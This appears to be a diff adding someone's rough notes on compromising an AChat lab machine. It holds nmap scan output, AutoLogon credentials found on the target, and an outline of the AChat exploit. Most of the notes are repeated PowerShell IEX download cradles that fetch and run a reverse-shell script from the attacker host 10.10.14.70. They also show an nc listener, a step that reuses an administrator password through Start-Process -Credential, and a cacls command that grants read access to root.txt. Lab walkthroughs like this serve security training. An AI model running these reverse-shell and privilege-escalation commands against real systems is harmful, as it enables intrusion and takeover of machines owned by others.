@@ -1,0 +1,119 @@
+└─$ nmap -sC -sV -Pn 10.129.167.232 -p9255,9256                                                                                                                   1 ⨯
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-05 01:28 +08
+Stats: 0:00:49 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 50.00% done; ETC: 01:29 (0:00:48 remaining)
+Nmap scan report for 10.129.167.232
+Host is up (0.25s latency).
+
+PORT     STATE SERVICE VERSION
+9255/tcp open  mon?
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 400 Bad Request
+|     Connection: close
+|     Server: AChat
+|   HTTPOptions, RTSPRequest, SIPOptions: 
+|     HTTP/1.1 200 OK
+|     Connection: close
+|_    Server: AChat
+9256/tcp open  achat   AChat chat system
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9255-TCP:V=7.91%I=7%D=3/5%Time=62224C34%P=x86_64-pc-linux-gnu%r(HTT
+SF:POptions,35,"HTTP/1\.1\x20200\x20OK\r\nConnection:\x20close\r\nServer:\
+SF:x20AChat\r\n\r\n")%r(RTSPRequest,35,"HTTP/1\.1\x20200\x20OK\r\nConnecti
+SF:on:\x20close\r\nServer:\x20AChat\r\n\r\n")%r(FourOhFourRequest,3E,"HTTP
+SF:/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nServer:\x20AC
+SF:hat\r\n\r\n")%r(SIPOptions,35,"HTTP/1\.1\x20200\x20OK\r\nConnection:\x2
+SF:0close\r\nServer:\x20AChat\r\n\r\n");
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 103.08 seconds
+
+
+Some AutoLogon credentials were found
+DefaultUserName               :  Alfred
+DefaultPassword               :  Welcome1!
+
+AChat Exploit
+
+
+
+need 3 terminals - 1 cmd, 2 powershell
+
+after you get cmd shell from AChat exploit (terminal 1):
+powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.70/shell.ps1')"
+
+-> terminal 1 will hang after you get a powershell reverse shell, but will launch a reverse shell on terminal 2
+
+
+
+On terminal 2:
+$SecPass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass)
+
+
+on terminal 3 run sudo nc lvnp 443
+
+On terminal 2:
+Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.70/shell.ps1')" -Credential $cred
+
+you will see that there was a new 200 get request, kill the request on terminal 1 to get the administrative shell on terminal 3
+
+
+
+
+privesc method 2:
+
+very strange, we have all access on administrator stuff but cannot read. so just give us the permission to read files using cacls
+cacls root.txt /t /e /p Alfred:F
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+powershell_execute "$SecPass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force"
+
+powershell_execute "$cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass)"
+
+powershell_execute "Start-Process -FilePath 'powershell' -argumentlist 'IEX(New-Object Net.WebClient).downloadString('http://10.10.14.70/shell.ps1')' -Credential $cred"
+
+
+
+Start-Process -FilePath 'powershell' -argumentlist 'IEX(New-Object Net.WebClient).downloadString("http://10.10.14.70/shell.ps1")' -Credential $cred
+
+
+Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.70/shell.ps1')" -Credential $cred
+
+
+
+
+
+powershell "$SecPass = ConvertTo-SecureString '3130438f31186fbaf962f407711faddb' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass); Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.70/shell.ps1')" -Credential $cred"
+
+
+
+
+Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.70/shell.ps1')" -Credential $cred
+
+Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.70/shell.ps1','C:\Users\Public\Desktop\shell.ps1')" -Credential $cred
+
+Start-Process -FilePath "powershell" -argumentlist "C:\Users\Public\Desktop\shell.ps1" -Credential $cred
+
+
+
